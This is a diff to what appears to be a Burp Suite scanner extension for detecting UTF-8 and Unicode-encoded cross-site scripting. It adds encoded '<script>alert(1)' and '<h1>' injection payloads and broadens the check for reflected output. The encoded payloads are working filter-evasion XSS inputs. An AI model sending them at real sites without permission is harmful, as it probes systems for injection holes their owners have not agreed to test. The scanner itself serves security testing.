@@ -267,7 +267,7 @@ class UTF8Xss(IScannerCheck):
     def __init__(self, callbacks):
         self._helpers = callbacks.getHelpers()
         self._done = getIssues('Cross-site scripting')
-        self._payloads = ['%uff1cscript%uff1ealert(1)%uff1c/script%uff1e','<%00script>alert(\'XSS\')<%00/script>','%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE','%EF%BC%9Cscript%EF%BC%9Ealert(123)%EF%BC%9C/script%EF%BC%9E','\\u003cscript\\u003ealert(1)\\u003c\\u002fscript\\u003e']
+        self._payloads = ['%uff1cscript%uff1ealert(1)%uff1c/script%uff1e','<%00script>alert(1)<%00/script>','%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE','%EF%BC%9Cscript%EF%BC%9Ealert(1)%EF%BC%9C/script%EF%BC%9E','\\u003cscript\\u003ealert(1)\\u003c\\u002fscript\\u003e','%uff1ch1%uff1eabrakadabra(1)%uff1c/h1%uff1e','<%00h1>abrakadabra(1)<%00/h1>','%C0%BCh1%C0%BEabrakadabra(1)%C0%BC/h1%C0%BE','%EF%BC%9Ch1%EF%BC%9Eabrakadabra(1)%EF%BC%9C/h1%EF%BC%9E','\\u003ch1\\u003eabrakadabra(1)\\u003c\\u002fh1\\u003e']
 
     def doActiveScan(self, basePair, insertionPoint):
 	if self._helpers.analyzeRequest(basePair.getRequest()).getMethod() == 'GET':
@@ -287,7 +287,7 @@ class UTF8Xss(IScannerCheck):
 			    attack = callbacks.makeHttpRequest(basePair.getHttpService(), newRequest)
 			    resp = self._helpers.bytesToString(attack.getResponse())
 			    
-			    if ">alert(1)<" in resp:
+			    if (">alert(1)<" in resp) or (">abrakadabra" in resp):
 				url = self._helpers.analyzeRequest(attack).getUrl()
 				if (url not in self._done):
 				    self._done.append(url)
